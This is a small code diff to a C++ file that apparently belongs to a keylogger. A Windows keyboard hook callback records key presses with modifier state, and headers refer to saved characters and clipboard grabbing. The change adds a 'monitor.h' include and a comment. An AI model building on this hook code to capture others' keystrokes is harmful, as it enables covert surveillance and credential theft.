@@ -1,7 +1,7 @@
 #include "includes.h"
 #include "handleChars.h"
 #include "grabClipboard.h"
-
+#include "monitor.h"
 
 std::vector<std::string> savedChars = {}; //have to use string for TAB and stuff like that.
 std::vector<std::string> savedSentences = { "" }; //init emtpy string fist off
@@ -38,8 +38,12 @@ LRESULT CALLBACK proc(int code, WPARAM wparam, LPARAM lparam)
 		{
 			if (wparam == WM_KEYDOWN)
 			{
+				//handling code in here, all if-statements went through...
+
 				if (is_control_on) { std::cout << "CTRL + "; }
 				std::cout << handleChars(keyboardStruct->vkCode, is_shift_on) << '\n';
+
+
 			}
 		}
 	}
